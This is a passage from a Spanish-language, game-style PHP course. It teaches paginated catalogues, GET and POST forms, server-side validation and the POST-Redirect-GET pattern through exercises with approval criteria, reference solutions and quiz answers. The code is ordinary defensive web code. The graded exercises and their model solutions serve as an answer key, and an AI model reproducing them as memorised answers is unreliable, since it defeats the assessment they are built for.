entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Generá con un `for` un catálogo de **23 productos** (`Producto 1` … `Producto 23`,
con precio `1000 + $i * 250`). Escribí `catalogo.php` que lo muestra **de a 5**
con paginación por GET:

- la página se acota entre 1 y la última (si piden la 99, se muestra la última);
- se puede elegir cuántos por página con `?por=10` (solo 5, 10 o 20);
- abajo, un enlace por cada página (la actual sin enlace, en `<strong>`), y
  "anterior"/"siguiente" cuando corresponde;
- arriba, `Mostrando 6–10 de 23`.

#### Criterio de aprobación

- Usa `array_slice` y `ceil` para paginar.
- Acota la página y valida `por` contra una lista.
- Los enlaces conservan `por` con `http_build_query`.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 3 - El catálogo paginado: array_slice, ceil y enlaces.
$productos = [];
for ($i = 1; $i <= 23; $i++) {
    $productos[] = ['nombre' => "Producto $i", 'precio' => 1000 + $i * 250];
}

$pedido = (int) ($_GET['por'] ?? 5);
$por = in_array($pedido, [5, 10, 20], true) ? $pedido : 5;
$total = count($productos);
$paginas = (int) ceil($total / $por);
$pagina = min(max(1, (int) ($_GET['pagina'] ?? 1)), $paginas);
$desde = ($pagina - 1) * $por;
$visibles = array_slice($productos, $desde, $por);
$enlace = fn(int $p): string => '?' . http_build_query(['pagina' => $p, 'por' => $por]);
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Catálogo</title></head>
<body>
    <h1>Catálogo</h1>
    <p>Mostrando <?= $desde + 1 ?>–<?= $desde + count($visibles) ?> de <?= $total ?></p>
    <ul>
        <?php foreach ($visibles as $p): ?>
            <li><?= $p['nombre'] ?>: $<?= number_format($p['precio'], 0, ',', '.') ?></li>
        <?php endforeach; ?>
    </ul>
    <nav>
        <?php if ($pagina > 1): ?><a href="<?= $enlace($pagina - 1) ?>">anterior</a><?php endif; ?>
        <?php for ($p = 1; $p <= $paginas; $p++): ?>
            <?php if ($p === $pagina): ?>
                <strong><?= $p ?></strong>
            <?php else: ?>
                <a href="<?= $enlace($p) ?>"><?= $p ?></a>
            <?php endif; ?>
        <?php endfor; ?>
        <?php if ($pagina < $paginas): ?><a href="<?= $enlace($pagina + 1) ?>">siguiente</a><?php endif; ?>
    </nav>
</body>
</html>
```

### Encargo R03-N02-E1 · El conversor de unidades en la web

```meta
entrega: codigo
entorno: local
monedas: 1
xp: 15
```

#### Consigna

Una ferretería quiere un conversor en su página. Escribí `conversor.php` con un
formulario GET: un número (`valor`), una unidad de origen y una de destino
(`<select>` con `mm`, `cm`, `m`, `pulgada`, `pie`). Guardá los factores **a metros**
en una constante (`pulgada` = 0.0254, `pie` = 0.3048…). Si los datos son válidos,
mostrá `12 pulgada = 30,48 cm` (con `number_format` a la argentina, hasta 4
decimales sin ceros de más: podés usar `rtrim(rtrim(…, '0'), ',')`). Si el valor no
es numérico o alguna unidad no existe, mostrá el error correspondiente sin romper la
página. El formulario conserva los valores.

#### Criterio de aprobación

- Valida el número y las dos unidades contra la constante.
- El resultado se muestra formateado y el formulario conserva los valores.
- Los errores se muestran sin avisos de PHP.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Encargo - El conversor de unidades: un formulario GET con validación.
const A_METROS = ['mm' => 0.001, 'cm' => 0.01, 'm' => 1.0, 'pulgada' => 0.0254, 'pie' => 0.3048];

function numero(float $n): string
{
    return rtrim(rtrim(number_format($n, 4, ',', '.'), '0'), ',');
}

$valorTexto = str_replace(',', '.', trim($_GET['valor'] ?? ''));
$de = $_GET['de'] ?? 'pulgada';
$a = $_GET['a'] ?? 'cm';
$error = null;
$resultado = null;

if ($valorTexto !== '') {
    if (!is_numeric($valorTexto)) {
        $error = 'El valor tiene que ser un número.';
    } elseif (!isset(A_METROS[$de], A_METROS[$a])) {
        $error = 'Unidad desconocida.';
    } else {
        $resultado = (float) $valorTexto * A_METROS[$de] / A_METROS[$a];
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Conversor</title></head>
<body>
    <h1>Conversor de medidas</h1>
    <form method="get">
        <input type="text" name="valor" value="<?= htmlspecialchars($_GET['valor'] ?? '') ?>">
        <select name="de">
            <?php foreach (array_keys(A_METROS) as $u): ?>
                <option value="<?= $u ?>" <?= $u === $de ? 'selected' : '' ?>><?= $u ?></option>
            <?php endforeach; ?>
        </select>
        a
        <select name="a">
            <?php foreach (array_keys(A_METROS) as $u): ?>
                <option value="<?= $u ?>" <?= $u === $a ? 'selected' : '' ?>><?= $u ?></option>
            <?php endforeach; ?>
        </select>
        <button>Convertir</button>
    </form>
    <?php if ($error !== null): ?>
        <p>Error: <?= $error ?></p>
    <?php elseif ($resultado !== null): ?>
        <p><?= numero((float) $valorTexto) ?> <?= htmlspecialchars($de) ?> = <?= numero($resultado) ?> <?= htmlspecialchars($a) ?></p>
    <?php endif; ?>
</body>
</html>
```

### Prueba del sello

#### ¿Dónde viajan los datos de un formulario con `method="get"`?

En la dirección, después del `?`, como pares `clave=valor` separados por `&`; PHP los pone en `$_GET`.

#### ¿De qué tipo son los valores de `$_GET`?

Siempre texto (o arrays de textos): hay que convertirlos y validarlos.

#### ¿Qué pasa con un checkbox que no se tildó?

No se envía: su clave no existe en `$_GET`. Se pregunta con `isset`.

#### ¿Para qué sirve `http_build_query`?

Para armar una query string a partir de un array, codificando los espacios y símbolos de los valores.

#### ¿Por qué no se usa GET para mandar una contraseña o borrar un dato?

Porque queda en la dirección (en el historial, en los registros del servidor, en los enlaces compartidos). GET es para consultar; para cambiar datos o mandar secretos se usa POST.

### Soluciones (docente)

Nodo nuevo (el capítulo original es de consola). Se corrigen abriendo la página con `php -S` y probando direcciones a mano: vale la pena probar valores raros (`?pagina=-3`, `?genero=<b>x`, `?n=abc`) para ver que la validación aguanta. En la misión 1, `desde` usa `FILTER_VALIDATE_INT`, que devuelve `false` si el campo está vacío.

## R03-N03 · Formularios con POST y validación

```meta
tipo: tema
padre: R03-N02
precio: 10
criatura: goblin
temas: web.formularios, err.validacion
usa: html.formularios
```

### Crónica

En la ventanilla de envíos, los formularios de papel llegan con de todo: el casillero de *peso* dice "bastante", el de *destino* está en blanco, el teléfono tiene letras. El empleado nuevo los mandaba igual y los barcos salían con paquetes perdidos. La jefa de ventanilla le enseñó a devolverlos: con cada error marcado en rojo **y sin borrar lo que el cliente ya había escrito bien**.

—Cuando alguien te **manda** algo para que lo guardes o lo proceses, viaja por **POST**, escondido del camino —dice {mentor}—. Y todo lo que llega se revisa, campo por campo, antes de hacer nada. Si algo está mal, se devuelve el formulario con los errores, {heroe}. Nadie quiere volver a escribir todo desde cero.

### Objetivos

- Enviar formularios con `method="post"` y leer `$_POST`.
- Distinguir si la página se pidió para mostrar el formulario (GET) o para procesarlo (POST).
- Validar cada campo y juntar los errores en un array.
- Volver a mostrar el formulario con los errores y los valores ya cargados.
- Usar los distintos campos: texto, número, email, `select`, `radio`, `checkbox` y `textarea`.
- Redirigir después de procesar (el patrón POST-Redirect-GET).

### Antes de empezar

- Formularios con GET, `htmlspecialchars` y validación contra una lista (R03-N02).

### Explicación

#### GET o POST
| | GET | POST |
|---|---|---|
| dónde viajan los datos | en la dirección | en el cuerpo del pedido |
| se ven en el historial | sí | no |
| para | consultar | **mandar** datos: registrarse, comprar, guardar |
| en PHP | `$_GET` | `$_POST` |

```html
<form method="post" action="envio.php">
    <input type="text" name="destinatario">
    <button>Enviar</button>
</form>
```

#### Una página que muestra y procesa
Lo más cómodo es que la **misma** página muestre el formulario y lo procese:
```php
$errores = [];
$datos = ['destinatario' => '', 'peso' => ''];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $datos['destinatario'] = trim($_POST['destinatario'] ?? '');
    $datos['peso'] = trim($_POST['peso'] ?? '');

    if ($datos['destinatario'] === '') {
        $errores['destinatario'] = 'Falta el destinatario.';
    }
    if (filter_var($datos['peso'], FILTER_VALIDATE_FLOAT) === false || (float) $datos['peso'] <= 0) {
        $errores['peso'] = 'El peso tiene que ser un número mayor que 0.';
    }

    if ($errores === []) {
        // todo bien: guardar, calcular… y redirigir
    }
}
// Acá se muestra el formulario (con los errores y los valores de $datos).
```
- Los errores se guardan **por campo**, para mostrar cada uno al lado de su input.
- `$datos` guarda lo que escribió la persona, para devolvérselo en el `value`.

#### Mostrar errores y conservar valores
```php
<label>Peso (kg):
    <input type="text" name="peso" value="<?= htmlspecialchars($datos['peso']) ?>">
</label>
<?php if (isset($errores['peso'])): ?>
    <p class="error"><?= $errores['peso'] ?></p>
<?php endif; ?>
```

#### Los distintos campos
| Campo | HTML | Llega en `$_POST` |
|---|---|---|
| texto | `<input type="text" name="n">` | `"lo que escribió"` |
| número | `<input type="number" name="n">` | `"12"` (¡texto!) |
| email | `<input type="email" name="e">` | `"kira@puerto.com"` |
| área de texto | `<textarea name="t"></textarea>` | con los saltos de línea |
| lista | `<select name="s"><option value="a">` | el `value` elegido |
| opción única | `<input type="radio" name="r" value="x">` | el `value` elegido, o nada |
| casilla | `<input type="checkbox" name="c" value="1">` | `"1"`, o nada si no se tildó |
| varias casillas | `<input type="checkbox" name="extras[]" value="seguro">` | un **array** con los tildados |

El navegador puede validar algo (`required`, `type="email"`, `min`), pero eso se
saltea fácil: **la validación que vale es la del servidor**. Cualquiera puede
mandar un POST sin usar tu formulario.

#### POST-Redirect-GET
Si después de procesar mostrás "¡Listo!" en la misma respuesta, y la persona
aprieta F5, el navegador **vuelve a mandar el POST** (y el pedido se duplica).
La solución es **redirigir**:
```php
if ($errores === []) {
    // … guardar …
    header('Location: envio.php?listo=1', true, 303);   // 303: "andá a ver esta otra página"
    exit;                                                  // ¡siempre exit después de redirigir!
}
```
El navegador hace un GET a la nueva dirección, y ahí se muestra la confirmación.
En el próximo nodo vas a pasar el mensaje con la sesión en lugar de la dirección.

### Código de ejemplo

`envio.php`
```php
<?php
declare(strict_types=1);
/*
 * La ventanilla de envíos: POST, validación por campo, valores que se conservan y PRG.
 */
const DESTINOS = ['valle' => 'Valle de la Serpiente', 'forjas' => 'Forjas de Hierro', 'imperio' => 'Imperio de las Clases'];
const EXTRAS = ['seguro' => 'Seguro (+$1500)', 'urgente' => 'Urgente (+50%)', 'aviso' => 'Aviso de entrega'];

$datos = ['destinatario' => '', 'email' => '', 'peso' => '', 'destino' => 'valle', 'extras' => [], 'nota' => ''];
$errores = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $datos['destinatario'] = trim($_POST['destinatario'] ?? '');
    $datos['email'] = trim($_POST['email'] ?? '');
    $datos['peso'] = str_replace(',', '.', trim($_POST['peso'] ?? ''));
    $datos['destino'] = $_POST['destino'] ?? '';
    $datos['extras'] = array_values(array_intersect((array) ($_POST['extras'] ?? []), array_keys(EXTRAS)));
    $datos['nota'] = trim($_POST['nota'] ?? '');

    if (mb_strlen($datos['destinatario']) < 3) {
        $errores['destinatario'] = 'Escribí el nombre completo del destinatario.';
    }
    if (filter_var($datos['email'], FILTER_VALIDATE_EMAIL) === false) {
        $errores['email'] = 'El email no es válido.';
    }
    $peso = filter_var($datos['peso'], FILTER_VALIDATE_FLOAT);
    if ($peso === false || $peso <= 0 || $peso > 30) {
        $errores['peso'] = 'El peso va de 0 a 30 kg.';
    }
    if (!isset(DESTINOS[$datos['destino']])) {
        $errores['destino'] = 'Elegí un destino de la lista.';
    }
    if (mb_strlen($datos['nota']) > 200) {
        $errores['nota'] = 'La nota puede tener hasta 200 caracteres.';
    }

    if ($errores === []) {
        $costo = $peso * 450;
        if (in_array('urgente', $datos['extras'], true)) {
            $costo *= 1.5;
        }
        if (in_array('seguro', $datos['extras'], true)) {
            $costo += 1500;
        }
        header('Location: envio.php?' . http_build_query(['listo' => 1, 'costo' => round($costo, 2)]), true, 303);
        exit;
    }
}

$e = fn(string $s): string => htmlspecialchars($s);
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Envíos</title></head>
<body>
    <h1>Ventanilla de envíos</h1>
    <?php if (isset($_GET['listo'])): ?>
        <p>¡Envío registrado! Costo: $<?= number_format((float) ($_GET['costo'] ?? 0), 2, ',', '.') ?></p>
    <?php endif; ?>
    <?php if ($errores !== []): ?>
        <p>Revisá los <?= count($errores) ?> campo/s marcados.</p>
    <?php endif; ?>

    <form method="post">
        <p><label>Destinatario: <input type="text" name="destinatario" value="<?= $e($datos['destinatario']) ?>"></label>
            <?php if (isset($errores['destinatario'])): ?><strong><?= $errores['destinatario'] ?></strong><?php endif; ?></p>
        <p><label>Email: <input type="email" name="email" value="<?= $e($datos['email']) ?>"></label>
            <?php if (isset($errores['email'])): ?><strong><?= $errores['email'] ?></strong><?php endif; ?></p>
        <p><label>Peso (kg): <input type="text" name="peso" value="<?= $e($datos['peso']) ?>"></label>
            <?php if (isset($errores['peso'])): ?><strong><?= $errores['peso'] ?></strong><?php endif; ?></p>
        <p>Destino:
            <?php foreach (DESTINOS as $clave => $nombre): ?>
                <label><input type="radio" name="destino" value="<?= $clave ?>" <?= $datos['destino'] === $clave ? 'checked' : '' ?>> <?= $nombre ?></label>
            <?php endforeach; ?>
            <?php if (isset($errores['destino'])): ?><strong><?= $errores['destino'] ?></strong><?php endif; ?></p>
        <p>Extras:
            <?php foreach (EXTRAS as $clave => $nombre): ?>
                <label><input type="checkbox" name="extras[]" value="<?= $clave ?>" <?= in_array($clave, $datos['extras'], true) ? 'checked' : '' ?>> <?= $nombre ?></label>
            <?php endforeach; ?></p>
        <p><label>Nota:<br><textarea name="nota" rows="3"><?= $e($datos['nota']) ?></textarea></label>
            <?php if (isset($errores['nota'])): ?><strong><?= $errores['nota'] ?></strong><?php endif; ?></p>
        <button>Registrar envío</button>
    </form>
</body>
</html>
```

### ¿Para qué sirve?

Cada registro, cada compra, cada comentario y cada turno que se pide en la web es un formulario POST validado en el servidor. Un sistema que valida bien no se llena de datos basura, y uno que conserva los valores y marca los errores campo por campo es el que la gente termina de completar. Laravel automatiza exactamente esto (`$request->validate([...])`), y vas a entenderlo mejor por haberlo hecho a mano.

### Errores habituales

**Orco: el campo que no llegó.** `$_POST['email']` sin `??` da `Undefined array
key` cuando se abre la página por primera vez (con GET, no hay `$_POST`).

**Goblin: confiar en la validación del navegador.** `required` y `type="email"`
ayudan, pero cualquiera los saltea (desde las herramientas del navegador o con un
programa). La validación **del servidor** es la que vale.

**Ogro: el F5 que duplica.** Sin redirigir después del POST, recargar la página
vuelve a mandar el formulario. Redirigí con `header('Location: …', true, 303)`.

**Troll: el `exit` que falta.** Después de `header('Location: …')` el script
**sigue ejecutándose** si no ponés `exit`: puede guardar dos veces o mostrar cosas
que no debería.

**Orco: el array de checkboxes.** Con `name="extras[]"`, `$_POST['extras']` es un
array (o no existe). No lo trates como texto, y validá cada valor contra tu lista.

### Misión R03-N03-M1 · La inscripción a la regata

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `regata.php` con el formulario de inscripción a la regata del puerto:

- nombre del barco (obligatorio, de 3 a 30 caracteres);
- capitán o capitana (obligatorio);
- categoría (`select`: `optimist`, `laser`, `crucero`), validada contra la lista;
- tripulantes (número entero de 1 a 8);
- acepta el reglamento (`checkbox`, obligatorio).

Si hay errores, el formulario vuelve con cada error junto a su campo y los valores
conservados. Si está todo bien, se muestra `Inscripto: BARCO (CATEGORÍA) con N
tripulante/s. ¡Buena regata, CAPITÁN!` (en esta misión todavía sin redirigir).

#### Criterio de aprobación

- Distingue GET de POST con `$_SERVER['REQUEST_METHOD']`.
- Guarda los errores en un array por campo y conserva los valores.
- Valida la categoría contra una lista y los tripulantes con `filter_var`.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 1 - La inscripción a la regata: validar un POST campo por campo.
const CATEGORIAS = ['optimist', 'laser', 'crucero'];

$datos = ['barco' => '', 'capitan' => '', 'categoria' => 'optimist', 'tripulantes' => '1', 'reglamento' => false];
$errores = [];
$inscripto = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $datos['barco'] = trim($_POST['barco'] ?? '');
    $datos['capitan'] = trim($_POST['capitan'] ?? '');
    $datos['categoria'] = $_POST['categoria'] ?? '';
    $datos['tripulantes'] = trim($_POST['tripulantes'] ?? '');
    $datos['reglamento'] = isset($_POST['reglamento']);

    $largo = mb_strlen($datos['barco']);
    if ($largo < 3 || $largo > 30) {
        $errores['barco'] = 'El nombre del barco va de 3 a 30 caracteres.';
    }
    if ($datos['capitan'] === '') {
        $errores['capitan'] = 'Falta quién capitanea.';
    }
    if (!in_array($datos['categoria'], CATEGORIAS, true)) {
        $errores['categoria'] = 'Categoría inválida.';
    }
    if (filter_var($datos['tripulantes'], FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 8]]) === false) {
        $errores['tripulantes'] = 'Los tripulantes van de 1 a 8.';
    }
    if (!$datos['reglamento']) {
        $errores['reglamento'] = 'Hay que aceptar el reglamento.';
    }
    $inscripto = $errores === [];
}

$error = fn(string $campo): string => isset($errores[$campo]) ? ' <strong>' . $errores[$campo] . '</strong>' : '';
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Regata</title></head>
<body>
    <h1>Regata del Puerto</h1>
    <?php if ($inscripto): ?>
        <p>Inscripto: <?= htmlspecialchars($datos['barco']) ?> (<?= $datos['categoria'] ?>) con <?= (int) $datos['tripulantes'] ?> tripulante/s. ¡Buena regata, <?= htmlspecialchars($datos['capitan']) ?>!</p>
    <?php else: ?>
        <form method="post">
            <p><label>Barco: <input type="text" name="barco" value="<?= htmlspecialchars($datos['barco']) ?>"></label><?= $error('barco') ?></p>
            <p><label>Capitán/a: <input type="text" name="capitan" value="<?= htmlspecialchars($datos['capitan']) ?>"></label><?= $error('capitan') ?></p>
            <p><label>Categoría:
                <select name="categoria">
                    <?php foreach (CATEGORIAS as $c): ?>
                        <option value="<?= $c ?>" <?= $datos['categoria'] === $c ? 'selected' : '' ?>><?= $c ?></option>
                    <?php endforeach; ?>
                </select></label><?= $error('categoria') ?></p>
            <p><label>Tripulantes: <input type="number" name="tripulantes" value="<?= htmlspecialchars($datos['tripulantes']) ?>"></label><?= $error('tripulantes') ?></p>
            <p><label><input type="checkbox" name="reglamento" value="1" <?= $datos['reglamento'] ? 'checked' : '' ?>> Acepto el reglamento</label><?= $error('reglamento') ?></p>
            <button>Inscribir</button>
        </form>
    <?php endif; ?>
</body>
</html>
```

### Misión R03-N03-M2 · La encuesta del puerto

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `encuesta.php` con una encuesta de satisfacción:

- puntaje de 1 a 5 (cinco `radio`, obligatorio);
- qué servicios usó (`checkbox` múltiple `servicios[]`: `ferry`, `correo`,
  `aduana`, `fonda`), al menos uno;
- un comentario opcional (`textarea`, hasta 300 caracteres).

Al procesar, **redirigí** (POST-Redirect-GET) a `encuesta.php?gracias=1&puntaje=N`
con código 303. Con `?gracias=1`, la página muestra `¡Gracias! Puntuaste N/5.` y un
enlace para responder otra. Si el puntaje no viene o está fuera de rango, o no se
eligió ningún servicio válido, el formulario vuelve con los errores y lo tildado
conservado.

#### Criterio de aprobación

- Usa `servicios[]` y valida cada valor contra la lista.
- Redirige con `header('Location: …', true, 303)` seguido de `exit`.
- La página de gracias se muestra con GET.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 2 - La encuesta del puerto: radios, checkboxes múltiples y POST-Redirect-GET.
const SERVICIOS = ['ferry' => 'Ferry', 'correo' => 'Correo', 'aduana' => 'Aduana', 'fonda' => 'Fonda'];

$puntaje = null;
$servicios = [];
$comentario = '';
$errores = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $puntaje = filter_var($_POST['puntaje'] ?? '', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 5]]);
    $servicios = array_values(array_intersect((array) ($_POST['servicios'] ?? []), array_keys(SERVICIOS)));
    $comentario = trim($_POST['comentario'] ?? '');

    if ($puntaje === false) {
        $errores[] = 'Elegí un puntaje del 1 al 5.';
    }
    if ($servicios === []) {
        $errores[] = 'Marcá al menos un servicio.';
    }
    if (mb_strlen($comentario) > 300) {
        $errores[] = 'El comentario puede tener hasta 300 caracteres.';
    }
    if ($errores === []) {
        header('Location: encuesta.php?' . http_build_query(['gracias' => 1, 'puntaje' => $puntaje]), true, 303);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Encuesta</title></head>
<body>
    <h1>¿Cómo te atendimos?</h1>
    <?php if (isset($_GET['gracias'])): ?>
        <p>¡Gracias! Puntuaste <?= (int) ($_GET['puntaje'] ?? 0) ?>/5.</p>
        <p><a href="encuesta.php">Responder otra</a></p>
    <?php else: ?>
        <?php foreach ($errores as $error): ?>
            <p><strong><?= $error ?></strong></p>
        <?php endforeach; ?>
        <form method="post">
            <p>Puntaje:
                <?php for ($i = 1; $i <= 5; $i++): ?>
                    <label><input type="radio" name="puntaje" value="<?= $i ?>" <?= $puntaje === $i ? 'checked' : '' ?>> <?= $i ?></label>
                <?php endfor; ?></p>
            <p>Servicios que usaste:
                <?php foreach (SERVICIOS as $clave => $nombre): ?>
                    <label><input type="checkbox" name="servicios[]" value="<?= $clave ?>" <?= in_array($clave, $servicios, true) ? 'checked' : '' ?>> <?= $nombre ?></label>
                <?php endforeach; ?></p>
            <p><textarea name="comentario" rows="4"><?= htmlspecialchars($comentario) ?></textarea></p>
            <button>Enviar</button>
        </form>
    <?php endif; ?>
</body>
</html>
```

### Misión R03-N03-M3 · El cotizador de fletes

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `flete.php` con un formulario POST para cotizar un flete: origen y destino
(dos `select` con las mismas ciudades: `La Rioja`, `Chilecito`, `Aimogasta`,
`Chamical`), peso en kg y si hace falta ayudante (`checkbox`). Las distancias
entre ciudades están en un array asociativo de arrays (`DISTANCIAS['La Rioja']['Chilecito'] = 190`…).

Reglas: el origen y el destino tienen que ser distintos y existir; el peso, entre 1
y 2000 kg. El costo es $180 por km + $2 por kg, y $15000 si lleva ayudante.

Si está todo bien, mostrá la cotización **debajo del formulario** (que conserva los
datos), con el detalle de cada parte del costo.

#### Criterio de aprobación

- Valida que origen y destino existan y sean distintos.
- Busca la distancia en un array de dos niveles.
- Muestra la cotización con el detalle y el formulario con los datos conservados.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 3 - El cotizador de fletes: dos selects, un array de distancias y el detalle.
const DISTANCIAS = [
    'La Rioja' => ['Chilecito' => 190, 'Aimogasta' => 110, 'Chamical' => 140],
    'Chilecito' => ['La Rioja' => 190, 'Aimogasta' => 170, 'Chamical' => 320],
    'Aimogasta' => ['La Rioja' => 110, 'Chilecito' => 170, 'Chamical' => 250],
    'Chamical' => ['La Rioja' => 140, 'Chilecito' => 320, 'Aimogasta' => 250],
];

$datos = ['origen' => 'La Rioja', 'destino' => 'Chilecito', 'peso' => '', 'ayudante' => false];
$errores = [];
$cotizacion = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $datos = [
        'origen' => $_POST['origen'] ?? '',
        'destino' => $_POST['destino'] ?? '',
        'peso' => trim($_POST['peso'] ?? ''),
        'ayudante' => isset($_POST['ayudante']),
    ];
    if (!isset(DISTANCIAS[$datos['origen']]) || !isset(DISTANCIAS[$datos['destino']])) {
        $errores[] = 'Elegí ciudades de la lista.';
    } elseif ($datos['origen'] === $datos['destino']) {
        $errores[] = 'El origen y el destino tienen que ser distintos.';
    }
    $peso = filter_var($datos['peso'], FILTER_VALIDATE_FLOAT);
    if ($peso === false || $peso < 1 || $peso > 2000) {
        $errores[] = 'El peso va de 1 a 2000 kg.';
    }
    if ($errores === []) {
        $km = DISTANCIAS[$datos['origen']][$datos['destino']];
        $cotizacion = ['km' => $km * 180, 'kg' => $peso * 2, 'ayudante' => $datos['ayudante'] ? 15000 : 0];
    }
}
$pesos = fn(float $n): string => '$' . number_format($n, 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Fletes</title></head>
<body>
    <h1>Cotizá tu flete</h1>
    <?php foreach ($errores as $error): ?>
        <p><strong><?= $error ?></strong></p>
    <?php endforeach; ?>
    <form method="post">
        <?php foreach (['origen' => 'Desde', 'destino' => 'Hasta'] as $campo => $etiqueta): ?>
            <label><?= $etiqueta ?>:
                <select name="<?= $campo ?>">
                    <?php foreach (array_keys(DISTANCIAS) as $ciudad): ?>
                        <option <?= $datos[$campo] === $ciudad ? 'selected' : '' ?>><?= $ciudad ?></option>
                    <?php endforeach; ?>
                </select>
            </label>
        <?php endforeach; ?>
        <label>Peso (kg): <input type="text" name="peso" value="<?= htmlspecialchars($datos['peso']) ?>"></label>
        <label><input type="checkbox" name="ayudante" value="1" <?= $datos['ayudante'] ? 'checked' : '' ?>> Con ayudante</label>
        <button>Cotizar</button>
    </form>
    <?php if ($cotizacion !== null): ?>
        <h2><?= $datos['origen'] ?> → <?= $datos['destino'] ?></h2>
        <ul>
            <li>Distancia: <?= $pesos($cotizacion['km']) ?></li>
            <li>Peso: <?= $pesos($cotizacion['kg']) ?></li>
            <li>Ayudante: <?= $pesos($cotizacion['ayudante']) ?></li>
        </ul>
        <p>Total: <strong><?= $pesos(array_sum($cotizacion)) ?></strong></p>
    <?php endif; ?>
</body>
</html>
```

### Encargo R03-N03-E1 · El pedido de turnos del taller mecánico

```meta
entrega: codigo
entorno: local
monedas: 1
xp: 15
```

#### Consigna

Un taller mecánico quiere tomar pedidos de turno por la web. `turno.php` pide:

- nombre y teléfono (el teléfono: solo dígitos, espacios y guiones, entre 8 y 15
  dígitos contando solo los números);
- patente (formato viejo `ABC123` o nuevo `AB123CD`, sin importar mayúsculas:
  validala con `preg_match` y guardala en mayúsculas);
- fecha preferida (`<input type="date">`, que llega como `AAAA-MM-DD`): tiene que ser
  una fecha válida, **no** un domingo, y posterior a hoy;
- el servicio (`select`: service, frenos, alineación, otro) y, si es `otro`, una
  descripción obligatoria.

Si todo está bien, redirigí a `turno.php?pedido=PATENTE` y mostrá `Recibimos tu
pedido para PATENTE. Te llamamos para confirmar.`.

#### Criterio de aprobación

- Valida la patente con una expresión regular y la fecha con `DateTimeImmutable`.
- La descripción solo es obligatoria si el servicio es `otro`.
- Usa POST-Redirect-GET.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Encargo - El pedido de turnos del taller: validaciones combinadas y PRG.
date_default_timezone_set('America/Argentina/Buenos_Aires');
const SERVICIOS = ['service', 'frenos', 'alineación', 'otro'];

$d = ['nombre' => '', 'telefono' => '', 'patente' => '', 'fecha' => '', 'servicio' => 'service', 'descripcion' => ''];
$errores = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    foreach (array_keys($d) as $campo) {
        $d[$campo] = trim((string) ($_POST[$campo] ?? ''));
    }
    $d['patente'] = strtoupper(str_replace(' ', '', $d['patente']));

    if ($d['nombre'] === '') {
        $errores['nombre'] = 'Falta el nombre.';
    }
    $digitos = preg_replace('/\D/', '', $d['telefono']);
    if (!preg_match('/^[\d\s-]+$/', $d['telefono']) || strlen($digitos) < 8 || strlen($digitos) > 15) {
        $errores['telefono'] = 'El teléfono tiene que tener entre 8 y 15 números.';
    }
    if (!preg_match('/^([A-Z]{3}\d{3}|[A-Z]{2}\d{3}[A-Z]{2})$/', $d['patente'])) {
        $errores['patente'] = 'La patente es ABC123 o AB123CD.';
    }
    $fecha = DateTimeImmutable::createFromFormat('!Y-m-d', $d['fecha']);
    if ($fecha === false || $fecha->format('Y-m-d') !== $d['fecha']) {
        $errores['fecha'] = 'Elegí una fecha válida.';
    } elseif ($fecha->format('N') === '7') {
        $errores['fecha'] = 'Los domingos el taller está cerrado.';
    } elseif ($fecha <= new DateTimeImmutable('today')) {
        $errores['fecha'] = 'La fecha tiene que ser a partir de mañana.';
    }
    if (!in_array($d['servicio'], SERVICIOS, true)) {
        $errores['servicio'] = 'Elegí un servicio de la lista.';
    } elseif ($d['servicio'] === 'otro' && $d['descripcion'] === '') {
        $errores['descripcion'] = 'Contanos qué necesitás.';
    }

    if ($errores === []) {
        header('Location: turno.php?' . http_build_query(['pedido' => $d['patente']]), true, 303);
        exit;
    }
}
$h = fn(string $s): string => htmlspecialchars($s);
$err = fn(string $c): string => isset($errores[$c]) ? " <strong>{$errores[$c]}</strong>" : '';
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Turnos</title></head>
<body>
    <h1>Taller El Pistón: pedí tu turno</h1>
    <?php if (isset($_GET['pedido'])): ?>
        <p>Recibimos tu pedido para <?= $h($_GET['pedido']) ?>. Te llamamos para confirmar.</p>
    <?php else: ?>
        <form method="post">
            <p><label>Nombre: <input name="nombre" value="<?= $h($d['nombre']) ?>"></label><?= $err('nombre') ?></p>
            <p><label>Teléfono: <input name="telefono" value="<?= $h($d['telefono']) ?>"></label><?= $err('telefono') ?></p>
            <p><label>Patente: <input name="patente" value="<?= $h($d['patente']) ?>"></label><?= $err('patente') ?></p>
            <p><label>Fecha: <input type="date" name="fecha" value="<?= $h($d['fecha']) ?>"></label><?= $err('fecha') ?></p>
            <p><label>Servicio:
                <select name="servicio">
                    <?php foreach (SERVICIOS as $s): ?>
                        <option <?= $d['servicio'] === $s ? 'selected' : '' ?>><?= $s ?></option>
                    <?php endforeach; ?>
                </select></label><?= $err('servicio') ?></p>
            <p><label>Descripción: <input name="descripcion" value="<?= $h($d['descripcion']) ?>"></label><?= $err('descripcion') ?></p>
            <button>Pedir turno</button>
        </form>
    <?php endif; ?>
</body>
</html>
```

### Prueba del sello

#### ¿Cómo sabe la página si tiene que mostrar el formulario o procesarlo?

